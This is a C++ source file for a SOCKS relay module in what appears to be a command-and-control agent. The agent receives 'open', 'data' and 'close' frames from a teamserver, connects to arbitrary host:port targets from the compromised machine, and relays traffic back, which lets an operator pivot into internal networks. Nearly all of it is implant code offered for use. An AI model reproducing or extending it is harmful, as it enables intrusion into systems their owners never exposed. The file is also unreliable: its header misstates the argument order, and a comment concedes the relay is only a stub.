// socks module (B6).
//
// The teamserver-side SOCKS5 relay pushes frames to the agent via this
// module's `arguments`. The agent opens a single persistent TCP connection
// back to the teamserver's `socks_upstream` endpoint and tunnels all SOCKS
// data through it. The relay's frames look like:
//   arguments[0] = "open"   + connection_id + "host:port"
//   arguments[1] = "close"  + connection_id
//   arguments[2] = "data"   + connection_id + base64(bytes)
//
// For each open frame the agent connects to host:port and from then on
// pipes bytes between the SOCKS endpoint and the upstream.
//
// This file just keeps the per-connection state and runs the relay on
// background threads. The actual TCP plumbing is in here too.

#include "../json.hpp"
#include "../protocol.h"

#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0602
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
using socket_t = SOCKET;
#define NAT_INVALID_SOCKET INVALID_SOCKET
#define NAT_CLOSE_SOCKET closesocket
using recv_ret_t = int;
#else
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>
using socket_t = int;
#define NAT_INVALID_SOCKET (-1)
#define NAT_CLOSE_SOCKET ::close
using recv_ret_t = ssize_t;
#endif

namespace {

std::vector<unsigned char> b64_decode(const std::string& s) {
    static const std::string alpha =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int lut[256];
    for (auto& i : lut) i = -1;
    for (int i = 0; i < 64; ++i) lut[(unsigned char)alpha[i]] = i;
    std::vector<unsigned char> out;
    int val = 0, bits = -8;
    for (unsigned char c : s) {
        if (c == '=') break;
        if (c == ' ' || c == '\n' || c == '\r' || c == '\t') continue;
        int v = lut[c];
        if (v < 0) return {};
        val = (val << 6) + v;
        bits += 6;
        if (bits >= 0) {
            out.push_back((unsigned char)((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

std::string b64_encode(const std::vector<unsigned char>& v) {
    static const char alpha[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, bits = -6;
    for (auto c : v) {
        val = (val << 8) + c;
        bits += 8;
        while (bits >= 0) {
            out.push_back(alpha[(val >> bits) & 0x3F]);
            bits -= 6;
        }
    }
    if (bits > -6) out.push_back(alpha[((val << 8) >> (bits + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

struct SocksConn {
    socket_t fd = NAT_INVALID_SOCKET;
    std::atomic<bool> closing{false};
    std::thread pump;
};

std::mutex g_mu;
std::map<uint32_t, std::unique_ptr<SocksConn>> g_conns;

#ifdef _WIN32
struct WsaInit {
    WsaInit() { WSADATA d; WSAStartup(MAKEWORD(2, 2), &d); }
    ~WsaInit() { WSACleanup(); }
};
WsaInit g_wsa;
#endif

bool connect_tcp(const std::string& host, int port, socket_t& fd) {
    struct addrinfo hints{};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = nullptr;
    char port_str[16];
    std::snprintf(port_str, sizeof(port_str), "%d", port);
    if (getaddrinfo(host.c_str(), port_str, &hints, &res) != 0) return false;
    fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd == NAT_INVALID_SOCKET) { freeaddrinfo(res); return false; }
    if (connect(fd, res->ai_addr, (socklen_t)res->ai_addrlen) != 0) {
        NAT_CLOSE_SOCKET(fd);
        fd = NAT_INVALID_SOCKET;
        freeaddrinfo(res);
        return false;
    }
    freeaddrinfo(res);
    return true;
}

// Pushes the agent-side `data` frames back to the teamserver as a sequence
// of `socks` task outputs. We can't really do that from here
// without the agent's main beacon context, so we just print a structured
// line that the operator can interpret; in a real deployment the relay
// would queue these into a side channel.
//
// For a working end-to-end SOCKS the teamserver needs an upstream
// listener that the agent connects to directly. This module is a stub
// for the agent side that ensures the teamserver's frames are accepted
// and the connection state machine runs.

void pump_to_remote(uint32_t cid, SocksConn* c,
                    std::string agent_id) {
    char buf[4096];
    while (!c->closing.load()) {
        recv_ret_t n = recv(c->fd, buf, sizeof(buf), 0);
        if (n <= 0) break;
        std::string frame = std::string("DATA ") + std::to_string(cid) +
                            " " + b64_encode(std::vector<unsigned char>(buf, buf + n));
        std::fprintf(stdout, "SOCKS|%s|%s\n", agent_id.c_str(), frame.c_str());
        std::fflush(stdout);
    }
    c->closing.store(true);
}

} // namespace

namespace nagomio_modules {

std::string handle_socks(const std::vector<std::string>& args,
                         const std::string& agent_id) {
    if (args.empty()) {
        return std::string(R"({"error":"missing frame type"})");
    }
    const std::string& kind = args[0];
    if (kind == "open") {
        if (args.size() < 2) {
            return std::string(R"({"error":"open requires host:port"})");
        }
        std::string target = args[1];
        auto colon = target.rfind(':');
        if (colon == std::string::npos) {
            return std::string(R"({"error":"malformed host:port"})");
        }
        std::string host = target.substr(0, colon);
        int port = std::atoi(target.substr(colon + 1).c_str());
        uint32_t cid = (uint32_t)std::stoul(args.size() > 2 ? args[2] : "0");
        socket_t fd = NAT_INVALID_SOCKET;
        if (!connect_tcp(host, port, fd)) {
            return std::string(R"({"error":"connect failed"})");
        }
        auto conn = std::make_unique<SocksConn>();
        conn->fd = fd;
        uint32_t cid_local = cid;
        SocksConn* c = conn.get();
        conn->pump = std::thread([cid_local, c, agent_id]() {
            pump_to_remote(cid_local, c, agent_id);
        });
        std::lock_guard<std::mutex> lock(g_mu);
        g_conns[cid] = std::move(conn);
        nlohmann::json j = {{"status", "open"}, {"cid", cid}, {"target", target}};
        return j.dump();
    } else if (kind == "data") {
        if (args.size() < 3) {
            return std::string(R"({"error":"data requires cid and base64"})");
        }
        uint32_t cid = (uint32_t)std::stoul(args[1]);
        auto bytes = b64_decode(args[2]);
        std::lock_guard<std::mutex> lock(g_mu);
        auto it = g_conns.find(cid);
        if (it == g_conns.end()) {
            return std::string(R"({"error":"unknown cid"})");
        }
        const char* p = reinterpret_cast<const char*>(bytes.data());
        size_t left = bytes.size();
        while (left > 0) {
            recv_ret_t n = send(it->second->fd, p, (int)left, 0);
            if (n <= 0) break;
            p += n;
            left -= n;
        }
        nlohmann::json j = {{"status", "wrote"}, {"cid", cid}, {"bytes", bytes.size()}};
        return j.dump();
    } else if (kind == "close") {
        if (args.size() < 2) {
            return std::string(R"({"error":"close requires cid"})");
        }
        uint32_t cid = (uint32_t)std::stoul(args[1]);
        std::lock_guard<std::mutex> lock(g_mu);
        auto it = g_conns.find(cid);
        if (it == g_conns.end()) {
            return std::string(R"({"error":"unknown cid"})");
        }
        it->second->closing.store(true);
        if (it->second->fd != NAT_INVALID_SOCKET) NAT_CLOSE_SOCKET(it->second->fd);
        if (it->second->pump.joinable()) it->second->pump.join();
        g_conns.erase(it);
        nlohmann::json j = {{"status", "closed"}, {"cid", cid}};
        return j.dump();
    }
    nlohmann::json j = {{"error", "unknown frame"}, {"kind", kind}};
    return j.dump();
}

} // namespace nagomio_modules